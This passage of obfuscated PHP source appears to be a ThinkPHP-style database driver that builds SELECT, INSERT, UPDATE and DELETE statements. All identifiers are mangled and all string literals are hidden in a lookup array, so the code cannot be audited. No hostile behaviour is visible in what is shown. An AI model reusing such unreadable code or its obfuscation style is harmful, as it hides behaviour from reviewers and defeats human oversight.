=& $_SERVER[–Ú¬çÁ]; if (empty($Ã‚È›ã)) { return !1; } $á Õ¦òë = parse_url($Ã‚È›ã); if ($á Õ¦òë[$Ä¥®Öô±[195]]) { $Õò±ô = array($Ä¥®Öô±[981] => $á Õ¦òë[$Ä¥®Öô±[195]], $Ä¥®Öô±[908] => isset($á Õ¦òë[$Ä¥®Öô±[640]]) ? $á Õ¦òë[$Ä¥®Öô±[640]] : $Ä¥®Öô±[12], $Ä¥®Öô±[909] => isset($á Õ¦òë[$Ä¥®Öô±[1005]]) ? $á Õ¦òë[$Ä¥®Öô±[1005]] : $Ä¥®Öô±[12], $Ä¥®Öô±[906] => isset($á Õ¦òë[$Ä¥®Öô±[196]]) ? $á Õ¦òë[$Ä¥®Öô±[196]] : $Ä¥®Öô±[12], $Ä¥®Öô±[907] => isset($á Õ¦òë[$Ä¥®Öô±[197]]) ? $á Õ¦òë[$Ä¥®Öô±[197]] : $Ä¥®Öô±[12], $Ä¥®Öô±[21] => isset($á Õ¦òë[$Ä¥®Öô±[84]]) ? substr($á Õ¦òë[$Ä¥®Öô±[84]], 1) : $Ä¥®Öô±[12]); } else { preg_match($Ä¥®Öô±[1006], trim($Ã‚È›ã), $¯ÕüÌ °); $Õò±ô = array($Ä¥®Öô±[981] => $¯ÕüÌ °[1], $Ä¥®Öô±[908] => $¯ÕüÌ °[2], $Ä¥®Öô±[909] => $¯ÕüÌ °[3], $Ä¥®Öô±[906] => $¯ÕüÌ °[4], $Ä¥®Öô±[907] => $¯ÕüÌ °[5], $Ä¥®Öô±[21] => $¯ÕüÌ °[6]); } $Õò±ô[$Ä¥®Öô±[936]] = $Ä¥®Öô±[12]; return $Õò±ô; } protected function debug() { $ŸöƒèÙ½ =& $_SERVER[–Ú¬çÁ]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $ŸöƒèÙ½[1007]; if (think_config($ŸöƒèÙ½[1008])) { think_status($ŸöƒèÙ½[1009]); think_trace($this->queryStr . $ŸöƒèÙ½[1010] . think_status($ŸöƒèÙ½[24], $ŸöƒèÙ½[1009], 6) . $ŸöƒèÙ½[1011], $ŸöƒèÙ½[12], $ŸöƒèÙ½[1012]); } } protected function parseLock($âå¥¾ø¬ = false) { $ñù‰£§š =& $_SERVER[–Ú¬çÁ]; if (!$âå¥¾ø¬) { return $ñù‰£§š[12]; } if ($ñù‰£§š[938] == $this->dbType) { return $ñù‰£§š[1013]; } return $ñù‰£§š[1014]; } protected function parseSet($•ü…¡‚à) { $Óš©½«Ä =& $_SERVER[–Ú¬çÁ]; foreach ($•ü…¡‚à as $ğ’±£ => $ûÇÛ¦ä) { if (is_array($ûÇÛ¦ä) && $Óš©½«Ä[350] == $ûÇÛ¦ä[0]) { $æñ†°•¼[] = $this->parseKey($ğ’±£) . $Óš©½«Ä[904] . $ûÇÛ¦ä[1]; } elseif (is_scalar($ûÇÛ¦ä) || is_null($ûÇÛ¦ä)) { $æñ†°•¼[] = $this->parseKey($ğ’±£) . $Óš©½«Ä[904] . $this->parseValue($ûÇÛ¦ä); } } return $Óš©½«Ä[1015] . implode($Óš©½«Ä[50], $æñ†°•¼); } protected function bindParam($¦ÏÆãªö, $ËØüÉÙÏ) { $this->bind[$_SERVER[–Ú¬çÁ][4] . $¦ÏÆãªö] = $ËØüÉÙÏ; } protected function parseBind($ş£‘ØÍ›) { $ş£‘ØÍ› = array_merge($this->bind, $ş£‘ØÍ›); $this->bind = array(); return $ş£‘ØÍ›; } function parseKey(&$Â³Öò˜³, $Õãø¡Ã = true) { if ($Õãø¡Ã) { $Â³Öò˜³ = $this->parseKeyCheck($Â³Öò˜³); } return $Â³Öò˜³; } function parseKeyCheck($å©úÃñ‚) { $±È ‘Í =& $_SERVER[–Ú¬çÁ]; $å©úÃñ‚ = trim($å©úÃñ‚); if (!preg_match($±È ‘Í[1016], $å©úÃñ‚)) { think_exception($±È ‘Í[1017] . $å©úÃñ‚); } return $å©úÃñ‚; } protected function parseValue($…†çş¶®) { $¦àïœ²Ì =& $_SERVER[–Ú¬çÁ]; if (is_string($…†çş¶®)) { $…†çş¶® = $¦àïœ²Ì[977] . $this->escapeString($…†çş¶®) . $¦àïœ²Ì[977]; } elseif (isset($…†çş¶®[0]) && is_string($…†çş¶®[0]) && strtolower($…†çş¶®[0]) == $¦àïœ²Ì[350]) { $…†çş¶® = $this->escapeString($…†çş¶®[1]); } elseif (is_array($…†çş¶®)) { $…†çş¶® = array_map(array($this, $¦àïœ²Ì[978]), $…†çş¶®); } elseif (is_bool($…†çş¶®)) { $…†çş¶® = $…†çş¶® ? $¦àïœ²Ì[88] : $¦àïœ²Ì[222]; } elseif (is_null($…†çş¶®)) { $…†çş¶® = $¦àïœ²Ì[103]; } return $…†çş¶®; } protected function parseField($èøò®Ê®) { $“·³ø¦ª =& $_SERVER[–Ú¬çÁ]; if (is_string($èøò®Ê®) && strpos($èøò®Ê®, $“·³ø¦ª[50])) { $èøò®Ê® = explode($“·³ø¦ª[50], $èøò®Ê®); } if (is_array($èøò®Ê®)) { $çÒ—ßÊ = array(); foreach ($èøò®Ê® as $ŸÃğ‚ => $íËªô¶ı) { if (!is_numeric($ŸÃğ‚)) { $çÒ—ßÊ[] = $this->parseKey($ŸÃğ‚, !1) . $“·³ø¦ª[1018] . $this->parseKey($íËªô¶ı); } else { $çÒ—ßÊ[] = $this->parseKey($íËªô¶ı); } } $ÒÔ¨Õ¡š = implode($“·³ø¦ª[50], $çÒ—ßÊ); } elseif (is_string($èøò®Ê®) && !empty($èøò®Ê®)) { $ÒÔ¨Õ¡š = $èøò®Ê®; } else { $ÒÔ¨Õ¡š = $“·³ø¦ª[213]; } return $ÒÔ¨Õ¡š; } protected function parseTable($Ç·ş­˜) { $­÷Ëêî =& $_SERVER[–Ú¬çÁ]; if (is_array($Ç·ş­˜)) { $÷Â¾š×ù = array(); foreach ($Ç·ş­˜ as $ß™Ş„Ò => $Ã˜Òˆ„‹) { if (!is_numeric($ß™Ş„Ò)) { $÷Â¾š×ù[] = $this->parseKey($ß™Ş„Ò) . $­÷Ëêî[53] . $this->parseKey($Ã˜Òˆ„‹); } else { $÷Â¾š×ù[] = $this->parseKey($ß™Ş„Ò); } } $Ç·ş­˜ = $÷Â¾š×ù; } elseif (is_string($Ç·ş­˜)) { if (strstr($Ç·ş­˜, $­÷Ëêî[53])) { return $Ç·ş­˜; } $Ç·ş­˜ = explode($­÷Ëêî[50], $Ç·ş­˜); array_walk($Ç·ş­˜, array($this, $­÷Ëêî[926])); } return $­÷Ëêî[920] . trim(implode($­÷Ëêî[1019], $Ç·ş­˜), $­÷Ëêî[438]) . $­÷Ëêî[920]; } protected function parseWhere($Äáò†‡ö) { $â»ÍÃ› =& $_SERVER[–Ú¬çÁ]; $‘ßÌóš… = $â»ÍÃ›[12]; if (is_string($Äáò†‡ö)) { $‘ßÌóš… = $Äáò†‡ö; } else { $ï’õ¹Û“ = isset($Äáò†‡ö[$â»ÍÃ›[1020]]) ? strtoupper($Äáò†‡ö[$â»ÍÃ›[1020]]) : $â»ÍÃ›[12]; if (in_array($ï’õ¹Û“, array($â»ÍÃ›[1021], $â»ÍÃ›[1022], $â»ÍÃ›[1023]))) { $ï’õ¹Û“ = $â»ÍÃ›[53] . $ï’õ¹Û“ . $â»ÍÃ›[53]; unset($Äáò†‡ö[$â»ÍÃ›[1020]]); } else { $ï’õ¹Û“ = $â»ÍÃ›[1024]; } foreach ($Äáò†‡ö as $Ú«³æö => $Ãş¿ø£ú) { $‘ßÌóš… .= $â»ÍÃ›[330]; if (is_numeric($Ú«³æö)) { $Ú«³æö = $â»ÍÃ›[1025]; } if (0 === strpos($Ú«³æö, $â»ÍÃ›[11])) { $‘ßÌóš… .= $this->parseThinkWhere($Ú«³æö, $Ãş¿ø£ú); } else { if (!preg_match($â»ÍÃ›[1026], trim($Ú«³æö))) { think_exception(think_lang($â»ÍÃ›[1027]) . $â»ÍÃ›[4] . $Ú«³æö); } $Ïşêó… = is_array($Ãş¿ø£ú) && isset($Ãş¿ø£ú[$â»ÍÃ›[1028]]); $Ú«³æö = trim($Ú«³æö); if (strpos($Ú«³æö, $â»ÍÃ›[336])) { $Áñ‡ÍÆ« = explode($â»ÍÃ›[336], $Ú«³æö); $ÈÑÆÂàÃ = array(); foreach ($Áñ‡ÍÆ« as $¸€î³Ê => $±Ê»ÍÈŒ) { $ü˜Ä©Ôƒ = $Ïşêó… ? $Ãş¿ø£ú[$¸€î³Ê] : $Ãş¿ø£ú; $ÈÑÆÂàÃ[] = $â»ÍÃ›[313] . $this->parseWhereItem($this->parseKey($±Ê»ÍÈŒ), $ü˜Ä©Ôƒ) . $â»ÍÃ›[925]; } $‘ßÌóš… .= implode($â»ÍÃ›[1029], $ÈÑÆÂàÃ); } elseif (strpos($Ú«³æö, $â»ÍÃ›[337])) { $Áñ‡ÍÆ« = explode($â»ÍÃ›[337], $Ú«³æö); $ÈÑÆÂàÃ = array(); foreach ($Áñ‡ÍÆ« as $¸€î³Ê => $±Ê»ÍÈŒ) { $ü˜Ä©Ôƒ = $Ïşêó… ? $Ãş¿ø£ú[$¸€î³Ê] : $Ãş¿ø£ú; $ÈÑÆÂàÃ[] = $â»ÍÃ›[313] . $this->parseWhereItem($this->parseKey($±Ê»ÍÈŒ), $ü˜Ä©Ôƒ) . $â»ÍÃ›[925]; } $‘ßÌóš… .= implode($â»ÍÃ›[1024], $ÈÑÆÂàÃ); } else { $‘ßÌóš… .= $this->parseWhereItem($this->parseKey($Ú«³æö), $Ãş¿ø£ú); } } $‘ßÌóš… .= $â»ÍÃ›[331] . $ï’õ¹Û“; } $‘ßÌóš… = substr($‘ßÌóš…, 0, -strlen($ï’õ¹Û“)); } return empty($‘ßÌóš…) ? $â»ÍÃ›[12] : $â»ÍÃ›[1030] . $‘ßÌóš…; } protected function parseWhereItem($êŒ±á…û, $Á·ª£½Ğ) { $Ş¸Â¥§ã =& $_SERVER[–Ú¬çÁ]; $ëÈ†µò« = $Ş¸Â¥§ã[12]; if (is_array($Á·ª£½Ğ)) { if (is_string($Á·ª£½Ğ[0])) { $çü†ã€€ = strtolower($Á·ª£½Ğ[0]); if (in_array($Á·ª£½Ğ[0], array($Ş¸Â¥§ã[904], $Ş¸Â¥§ã[1031], $Ş¸Â¥§ã[1032], $Ş¸Â¥§ã[1033], $Ş¸Â¥§ã[1034], $Ş¸Â¥§ã[1035]))) { $ëÈ†µò« .= $êŒ±á…û . $Ş¸Â¥§ã[53] . $Á·ª£½Ğ[0] . $Ş¸Â¥§ã[53] . $this->parseValue($Á·ª£½Ğ[1]); } elseif (preg_match($Ş¸Â¥§ã[1036], $Á·ª£½Ğ[0])) { $ëÈ†µò« .= $êŒ±á…û . $Ş¸Â¥§ã[53] . $this->exp[$çü†ã€€] . $Ş¸Â¥§ã[53] . $this->parseValue($Á·ª£½Ğ[1]); } elseif (preg_match($Ş¸Â¥§ã[1037], $Á·ª£½Ğ[0])) { if (is_array($Á·ª£½Ğ[1])) { $ò‡€ä¶× = isset($Á·ª£½Ğ[2]) ? strtoupper($Á·ª£½Ğ[2]) : $Ş¸Â¥§ã[1022]; if (in_array($ò‡€ä¶×, array($Ş¸Â¥§ã[1021], $Ş¸Â¥§ã[1022], $Ş¸Â¥§ã[1023]))) { $ÔÌïäış = array(); foreach ($Á·ª£½Ğ[1] as $´ºˆî÷¡) { $ÔÌïäış[] = $êŒ±á…û . $Ş¸Â¥§ã[53] . $this->exp[$çü†ã€€] . $Ş¸Â¥§ã[53] . $this->parseValue($´ºˆî÷¡); } $ëÈ†µò« .= $Ş¸Â¥§ã[313] . implode($Ş¸Â¥§ã[53] . $ò‡€ä¶× . $Ş¸Â¥§ã[53], $ÔÌïäış) . $Ş¸Â¥§ã[925]; } } else { $ëÈ†µò« .= $êŒ±á…û . $Ş¸Â¥§ã[53] . $this->exp[$çü†ã€€] . $Ş¸Â¥§ã[53] . $this->parseValue($Á·ª£½Ğ[1]); } } elseif ($Ş¸Â¥§ã[350] == $çü†ã€€) { $ëÈ†µò« .= $Ş¸Â¥§ã[923] . $êŒ±á…û . $Ş¸Â¥§ã[53] . $Á·ª£½Ğ[1] . $Ş¸Â¥§ã[1038]; } elseif (preg_match($Ş¸Â¥§ã[1039], $Á·ª£½Ğ[0])) { $ëÈ†µò« .= $Á·ª£½Ğ[0]; } elseif (preg_match($Ş¸Â¥§ã[1040], $Á·ª£½Ğ[0])) { if (isset($Á·ª£½Ğ[2]) && $Ş¸Â¥§ã[350] == $Á·ª£½Ğ[2]) { $ëÈ†µò« .= $êŒ±á…û . $Ş¸Â¥§ã[53] . $this->exp[$çü†ã€€] . $Ş¸Â¥§ã[53] . $Á·ª£½Ğ[1]; } else { if (is_string($Á·ª£½Ğ[1])) { $Á·ª£½Ğ[1] = explode($Ş¸Â¥§ã[50], $Á·ª£½Ğ[1]); } $‰ÇÜßÉÙ = implode($Ş¸Â¥§ã[50], $this->parseValue($Á·ª£½Ğ[1])); $ëÈ†µò« .= $êŒ±á…û . $Ş¸Â¥§ã[53] . $this->exp[$çü†ã€€] . $Ş¸Â¥§ã[923] . $‰ÇÜßÉÙ . $Ş¸Â¥§ã[925]; } } elseif (preg_match($Ş¸Â¥§ã[1041], $Á·ª£½Ğ[0])) { $ãøÃÆ¤à = is_string($Á·ª£½Ğ[1]) ? explode($Ş¸Â¥§ã[50], $Á·ª£½Ğ[1]) : $Á·ª£½Ğ[1]; $ëÈ†µò« .= $Ş¸Â¥§ã[923] . $êŒ±á…û . $Ş¸Â¥§ã[53] . $this->exp[$çü†ã€€] . $Ş¸Â¥§ã[53] . $this->parseValue($ãøÃÆ¤à[0]) . $Ş¸Â¥§ã[1024] . $this->parseValue($ãøÃÆ¤à[1]) . $Ş¸Â¥§ã[331]; } else { think_exception(think_lang($Ş¸Â¥§ã[1027]) . $Ş¸Â¥§ã[4] . $Á·ª£½Ğ[0]); } } else { $ªö‚•ÊĞ = count($Á·ª£½Ğ); $ˆ°ãÛã = $Ş¸Â¥§ã[12]; if (is_string($Á·ª£½Ğ[$ªö‚•ÊĞ - 1])) { $ˆ°ãÛã = isset($Á·ª£½Ğ[$ªö‚•ÊĞ - 1]) ? strtoupper($Á·ª£½Ğ[$ªö‚•ÊĞ - 1]) : $Ş¸Â¥§ã[12]; if (in_array($ˆ°ãÛã, array($Ş¸Â¥§ã[1021], $Ş¸Â¥§ã[1022], $Ş¸Â¥§ã[1023]))) { $ªö‚•ÊĞ = $ªö‚•ÊĞ - 1; } } else { $ˆ°ãÛã = $Ş¸Â¥§ã[1021]; } for ($õˆÒ­”¦ = 0; $õˆÒ­”¦ < $ªö‚•ÊĞ; $õˆÒ­”¦++) { $ãøÃÆ¤à = is_array($Á·ª£½Ğ[$õˆÒ­”¦]) ? $Á·ª£½Ğ[$õˆÒ­”¦][1] : $Á·ª£½Ğ[$õˆÒ­”¦]; if ($Ş¸Â¥§ã[350] == strtolower($Á·ª£½Ğ[$õˆÒ­”¦][0])) { $ëÈ†µò« .= $Ş¸Â¥§ã[313] . $êŒ±á…û . $Ş¸Â¥§ã[53] . $ãøÃÆ¤à . $Ş¸Â¥§ã[1038] . $ˆ°ãÛã . $Ş¸Â¥§ã[53]; } else { $ğ¹´Ùô‹ = is_array($Á·ª£½Ğ[$õˆÒ­”¦]) ? $this->exp[strtolower($Á·ª£½Ğ[$õˆÒ­”¦][0])] : $Ş¸Â¥§ã[904]; if (!$ğ¹´Ùô‹ && is_array($Á·ª£½Ğ[$õˆÒ­”¦]) && in_array($Á·ª£½Ğ[$õˆÒ­”¦][0], array($Ş¸Â¥§ã[904], $Ş¸Â¥§ã[1031], $Ş¸Â¥§ã[1032], $Ş¸Â¥§ã[1033], $Ş¸Â¥§ã[1034], $Ş¸Â¥§ã[1035]))) { $ğ¹´Ùô‹ = $Á·ª£½Ğ[$õˆÒ­”¦][0]; } $ëÈ†µò« .= $Ş¸Â¥§ã[313] . $êŒ±á…û . $Ş¸Â¥§ã[53] . $ğ¹´Ùô‹ . $Ş¸Â¥§ã[53] . $this->parseValue($ãøÃÆ¤à) . $Ş¸Â¥§ã[1038] . $ˆ°ãÛã . $Ş¸Â¥§ã[53]; } } $ëÈ†µò« = substr($ëÈ†µò«, 0, -4); } } else { $ëÈ†µò« .= $êŒ±á…û . $Ş¸Â¥§ã[1042] . $this->parseValue($Á·ª£½Ğ); } return $ëÈ†µò«; } protected function parseThinkWhere($äŞ™ƒ‡×, $Ë¿´ıß­) { $©şóëä’ =& $_SERVER[–Ú¬çÁ]; $ŸÇìş‡ñ = $©şóëä’[12]; switch ($äŞ™ƒ‡×) { case $©şóëä’[405]: $ŸÇìş‡ñ = $Ë¿´ıß­; break; case $©şóëä’[1025]: $ŸÇìş‡ñ = is_string($Ë¿´ıß­) ? $Ë¿´ıß­ : substr($this->parseWhere($Ë¿´ıß­), 6); break; case $©şóëä’[1043]: parse_str($Ë¿´ıß­, $¸¤ŸÅ´Ó); if (isset($¸¤ŸÅ´Ó[$©şóëä’[1020]])) { $öë·÷§ = $©şóëä’[53] . strtoupper($¸¤ŸÅ´Ó[$©şóëä’[1020]]) . $©şóëä’[53]; unset($¸¤ŸÅ´Ó[$©şóëä’[1020]]); } else { $öë·÷§ = $©şóëä’[1024]; } $´Äêê¹ = array(); foreach ($¸¤ŸÅ´Ó as $¨†¼ÃÚí => $‘©Â‰½Ù) { $´Äêê¹[] = $this->parseKey($¨†¼ÃÚí) . $©şóëä’[1042] . $this->parseValue($‘©Â‰½Ù); } $ŸÇìş‡ñ = implode($öë·÷§, $´Äêê¹); break; } return $ŸÇìş‡ñ; } protected function parseLimit($‚ßİ¡¥È) { $õûŒÆ…å =& $_SERVER[–Ú¬çÁ]; return !empty($‚ßİ¡¥È) ? $õûŒÆ…å[51] . $‚ßİ¡¥È . $õûŒÆ…å[53] : $õûŒÆ…å[12]; } protected function parseJoin($Û»¸ù´Ê) { $Ìí›î¿ =& $_SERVER[–Ú¬çÁ]; $Ä¯Áßèë = $Ìí›î¿[12]; if (!empty($Û»¸ù´Ê)) { if (is_array($Û»¸ù´Ê)) { foreach ($Û»¸ù´Ê as $€°Ãã’™ => $ÃÕóŞ––) { if (!1 !== stripos($ÃÕóŞ––, $Ìí›î¿[1044])) { $Ä¯Áßèë .= $Ìí›î¿[53] . $ÃÕóŞ––; } else { $Ä¯Áßèë .= $Ìí›î¿[1045] . $ÃÕóŞ––; } } } else { $Ä¯Áßèë .= $Ìí›î¿[1045] . $Û»¸ù´Ê; } } $Ä¯Áßèë = preg_replace($Ìí›î¿[1046], think_config($Ìí›î¿[950]) . $Ìí›î¿[1047], $Ä¯Áßèë); return $Ä¯Áßèë; } protected function parseOrder($ªÄ¼èàç) { $¡èƒè¤ =& $_SERVER[–Ú¬çÁ]; if (is_array($ªÄ¼èàç)) { $·ØŠ³«å = array(); foreach ($ªÄ¼èàç as $Ó¡ÇÜË => $ÀØ‹¦­ˆ) { if (is_numeric($Ó¡ÇÜË)) { $·ØŠ³«å[] = $this->parseKey($ÀØ‹¦­ˆ); } else { $ÀØ‹¦­ˆ = in_array(strtoupper(trim($ÀØ‹¦­ˆ)), array($¡èƒè¤[1048], $¡èƒè¤[1049])) ? $¡èƒè¤[53] . $ÀØ‹¦­ˆ : $¡èƒè¤[12]; if (preg_match($¡èƒè¤[1050], $Ó¡ÇÜË)) { $·ØŠ³«å[] = $this->parseKey($Ó¡ÇÜË) . $ÀØ‹¦­ˆ; } else { think_exception($¡èƒè¤[1051] . $Ó¡ÇÜË); } } } $ªÄ¼èàç = implode($¡èƒè¤[50], $·ØŠ³«å); } return !empty($ªÄ¼èàç) ? $¡èƒè¤[1052] . $ªÄ¼èàç : $¡èƒè¤[12]; } protected function parseGroup($Õ®ö¥) { $æş¨ˆÆŠ =& $_SERVER[–Ú¬çÁ]; return !empty($Õ®ö¥) ? $æş¨ˆÆŠ[1053] . $Õ®ö¥ : $æş¨ˆÆŠ[12]; } protected function parseHaving($Ö„Ñ¢…ß) { $î´Ç§”ä =& $_SERVER[–Ú¬çÁ]; return !empty($Ö„Ñ¢…ß) ? $î´Ç§”ä[1054] . $Ö„Ñ¢…ß : $î´Ç§”ä[12]; } protected function parseComment($çÙõë›Ñ) { $¡«·ÏÕø =& $_SERVER[–Ú¬çÁ]; return !empty($çÙõë›Ñ) ? $¡«·ÏÕø[1055] . $çÙõë›Ñ . $¡«·ÏÕø[1056] : $¡«·ÏÕø[12]; } protected function parseDistinct($º›áƒŠÇ) { $‡®íç =& $_SERVER[–Ú¬çÁ]; return !empty($º›áƒŠÇ) ? $‡®íç[1057] : $‡®íç[12]; } protected function parseUnion($•Ú€ÒØâ) { $şâß§£„ =& $_SERVER[–Ú¬çÁ]; if (empty($•Ú€ÒØâ)) { return $şâß§£„[12]; } if (isset($•Ú€ÒØâ[$şâß§£„[401]])) { $Âï–ÔÍ = $şâß§£„[1058]; unset($•Ú€ÒØâ[$şâß§£„[401]]); } else { $Âï–ÔÍ = $şâß§£„[1059]; } foreach ($•Ú€ÒØâ as $ËÖ•ŠÔê) { $®õº°˜¢[] = $Âï–ÔÍ . (is_array($ËÖ•ŠÔê) ? $this->buildSelectSql($ËÖ•ŠÔê) : $ËÖ•ŠÔê); } return implode($şâß§£„[53], $®õº°˜¢); } public function insert($ä¾æ¯™², $ö¬àÉ†ñ = array(), $Œ’Â”‹ = false) { $§óí‘Ë¬ =& $_SERVER[–Ú¬çÁ]; $º•Ã›î× = $íôëƒ´Å = array(); $this->model = $ö¬àÉ†ñ[$§óí‘Ë¬[334]]; foreach ($ä¾æ¯™² as $¬Ş”½¬ª => $ÎÛÄø·) { if (is_array($ÎÛÄø·) && $§óí‘Ë¬[350] == $ÎÛÄø·[0]) { $íôëƒ´Å[] = $this->parseKey($¬Ş”½¬ª); $º•Ã›î×[] = $ÎÛÄø·[1]; } elseif (is_scalar($ÎÛÄø·) || is_null($ÎÛÄø·)) { $íôëƒ´Å[] = $this->parseKey($¬Ş”½¬ª); $º•Ã›î×[] = $this->parseValue($ÎÛÄø·); } } $ÜŸÛËÕã = ($Œ’Â”‹ ? $§óí‘Ë¬[927] : $§óí‘Ë¬[928]) . $§óí‘Ë¬[929] . $this->parseTable($ö¬àÉ†ñ[$§óí‘Ë¬[332]]) . $§óí‘Ë¬[923] . implode($§óí‘Ë¬[50], $íôëƒ´Å) . $§óí‘Ë¬[924] . implode($§óí‘Ë¬[50], $º•Ã›î×) . $§óí‘Ë¬[925]; $ÜŸÛËÕã .= $this->parseLock(isset($ö¬àÉ†ñ[$§óí‘Ë¬[864]]) ? $ö¬àÉ†ñ[$§óí‘Ë¬[864]] : !1); $ÜŸÛËÕã .= $this->parseComment(!empty($ö¬àÉ†ñ[$§óí‘Ë¬[407]]) ? $ö¬àÉ†ñ[$§óí‘Ë¬[407]] : $§óí‘Ë¬[12]); return $this->execute($ÜŸÛËÕã, $this->parseBind(!empty($ö¬àÉ†ñ[$§óí‘Ë¬[338]]) ? $ö¬àÉ†ñ[$§óí‘Ë¬[338]] : array())); } public function selectInsert($ıÁıèÄÁ, $Ÿ•ßû’, $´‰“¶Ç = array()) { $ÑÚıêû¾ =& $_SERVER[–Ú¬çÁ]; $this->model = $´‰“¶Ç[$ÑÚıêû¾[334]]; if (is_string($ıÁıèÄÁ)) { $ıÁıèÄÁ = explode($ÑÚıêû¾[50], $ıÁıèÄÁ); } array_walk($ıÁıèÄÁ, array($this, $ÑÚıêû¾[926])); $„˜±œÌš = $ÑÚıêû¾[1060] . $this->parseTable($Ÿ•ßû’) . $ÑÚıêû¾[923] . implode($ÑÚıêû¾[50], $ıÁıèÄÁ) . $ÑÚıêû¾[1038]; $„˜±œÌš .= $this->buildSelectSql($´‰“¶Ç); return $this->execute($„˜±œÌš, $this->parseBind(!empty($´‰“¶Ç[$ÑÚıêû¾[338]]) ? $´‰“¶Ç[$ÑÚıêû¾[338]] : array())); } public function update($´ÇÙ¤¡ƒ, $¸»Ÿü¼ğ) { $“ÓêìÇ„ =& $_SERVER[–Ú¬çÁ]; $this->model = $¸»Ÿü¼ğ[$“ÓêìÇ„[334]]; $Ä¹Úôè¤ = $“ÓêìÇ„[1061] . $this->parseTable($¸»Ÿü¼ğ[$“ÓêìÇ„[332]]) . $this->parseSet($´ÇÙ¤¡ƒ) . $this->parseWhere(!empty($¸»Ÿü¼ğ[$“ÓêìÇ„[328]]) ? $¸»Ÿü¼ğ[$“ÓêìÇ„[328]] : $“ÓêìÇ„[12]) . $this->parseOrder(!empty($¸»Ÿü¼ğ[$“ÓêìÇ„[418]]) ? $¸»Ÿü¼ğ[$“ÓêìÇ„[418]] : $“ÓêìÇ„[12]) . $this->parseLimit(!empty($¸»Ÿü¼ğ[$“ÓêìÇ„[345]]) ? $¸»Ÿü¼ğ[$“ÓêìÇ„[345]] : $“ÓêìÇ„[12]) . $this->parseLock(isset($¸»Ÿü¼ğ[$“ÓêìÇ„[864]]) ? $¸»Ÿü¼ğ[$“ÓêìÇ„[864]] : !1) . $this->parseComment(!empty($¸»Ÿü¼ğ[$“ÓêìÇ„[407]]) ? $¸»Ÿü¼ğ[$“ÓêìÇ„[407]] : $“ÓêìÇ„[12]); return $this->execute($Ä¹Úôè¤, $this->parseBind(!empty($¸»Ÿü¼ğ[$“ÓêìÇ„[338]]) ? $¸»Ÿü¼ğ[$“ÓêìÇ„[338]] : array())); } public function delete($­¹Ç®ó = array()) { $Úé«ñÆú =& $_SERVER[–Ú¬çÁ]; $this->model = $­¹Ç®ó[$Úé«ñÆú[334]]; $šÜÒ“ÜÑ = $Úé«ñÆú[1062] . $this->parseTable($­¹Ç®ó[$Úé«ñÆú[332]]) . $this->parseWhere(!empty($­¹Ç®ó[$Úé«ñÆú[328]]) ? $­¹Ç®ó[$Úé«ñÆú[328]] : $Úé«ñÆú[12]) . $this->parseOrder(!empty($­¹Ç®ó[$Úé«ñÆú[418]]) ? $­¹Ç®ó[$Úé«ñÆú[418]] : $Úé«ñÆú[12]) . $this->parseLimit(!empty($­¹Ç®ó[$Úé«ñÆú[345]]) ? $­¹Ç®ó[$Úé«ñÆú[345]] : $Úé«ñÆú[12]) . $this->parseLock(isset($­¹Ç®ó[$Úé«ñÆú[864]]) ? $­¹Ç®ó[$Úé«ñÆú[864]] : !1) . $this->parseComment(!empty($­¹Ç®ó[$Úé«ñÆú[407]]) ? $­¹Ç®ó[$Úé«ñÆú[407]] : $Úé«ñÆú[12]); return $this->execute($šÜÒ“ÜÑ, $this->parseBind(!empty($­¹Ç®ó[$Úé«ñÆú[338]]) ? $­¹Ç®ó[$Úé«ñÆú[338]] : array())); } public function select($§üË³©¾ = array()) { $Åî¬¢½ =& $_SERVER[–Ú¬çÁ]; $this->model = $§üË³©¾[$Åî¬¢½[334]]; $„Ê†ÔÛÄ = $this->buildSelectSql($§üË³©¾); $”¸ğÆ€‚ = isset($§üË³©¾[$Åî¬¢½[402]]) ? $§üË³©¾[$Åî¬¢½[402]] : !1; if ($”¸ğÆ€‚) { $–è¿ËÍ = is_string($”¸ğÆ€‚[$Åî¬¢½[94]]) ? $”¸ğÆ€‚[$Åî¬¢½[94]] : $Åî¬¢½[1063] . md5($„Ê†ÔÛÄ); $¸ÃÆ¥Ø = think_cache($–è¿ËÍ, $Åî¬¢½[12], $”¸ğÆ€‚); if (!1 !== $¸ÃÆ¥Ø) { return $¸ÃÆ¥Ø; } } $‰Ä‡Ëü = $this->query($„Ê†ÔÛÄ, $this->parseBind(!empty($§üË³©¾[$Åî¬¢½[338]]) ? $§üË³©¾[$Åî¬¢½[338]] : array())); if ($”¸ğÆ€‚ && !1 !== $‰Ä‡Ëü) { think_cache($–è¿ËÍ, $‰Ä‡Ëü, $”¸ğÆ€‚); } return $‰Ä‡Ëü; } public function buildSelectSql($Ÿò€á€¢ = array()) { $ÍæÑ–„ø =& $_SERVER[–Ú¬çÁ]; if (isset($Ÿò€á€¢[$ÍæÑ–„ø[406]])) { if (strpos($Ÿò€á€¢[$ÍæÑ–„ø[406]], $ÍæÑ–„ø[50])) { list($ìÙ¢›Â, $º¼œ¬‘“) = explode($ÍæÑ–„ø[50], $Ÿò€á€¢[$ÍæÑ–„ø[406]]); } else { $ìÙ¢›Â = $Ÿò€á€¢[$ÍæÑ–„ø[406]]; } $ìÙ¢›Â = $ìÙ¢›Â ? $ìÙ¢›Â : 1; $º¼œ¬‘“ = isset($º¼œ¬‘“) ? $º¼œ¬‘“ : (is_numeric($Ÿò€á€¢[$ÍæÑ–„ø[345]]) ? $Ÿò€á€¢[$ÍæÑ–„ø[345]] : 20); $É»³ğñ» = $º¼œ¬‘“ * ((int) $ìÙ¢›Â - 1); $Ÿò€á€¢[$ÍæÑ–„ø[345]] = $É»³ğñ» . $ÍæÑ–„ø[50] . $º¼œ¬‘“; } if (think_config($ÍæÑ–„ø[1064])) { $é§ìîí = $ÍæÑ–„ø[1065] . md5(serialize($Ÿò€á€¢)); $¦ÌŠ‡Ğ² = think_cache($é§ìîí); if ($¦ÌŠ‡Ğ²) { return $¦ÌŠ‡Ğ²; } } $Õ²Æ ·Ö = $this->parseSql($this->selectSql, $Ÿò€á€¢); $Õ²Æ ·Ö .= $this->parseLock(isset($Ÿò€á€¢[$ÍæÑ–„ø[864]]) ? $Ÿò€á€¢[$ÍæÑ–„ø[864]] : !1); if (isset($é§ìîí)) { think_cache($é§ìîí, $Õ²Æ ·Ö); } return $Õ²Æ ·Ö; } public function parseSql($²ÍßôÇƒ, $×£ÜşÏì = array()) { $ƒª•Ö¹Ô =& $_SERVER[–Ú¬çÁ]; $²ÍßôÇƒ = str_replace(array($ƒª•Ö¹Ô[1066], $ƒª•Ö¹Ô[1067], $ƒª•Ö¹Ô[1068], 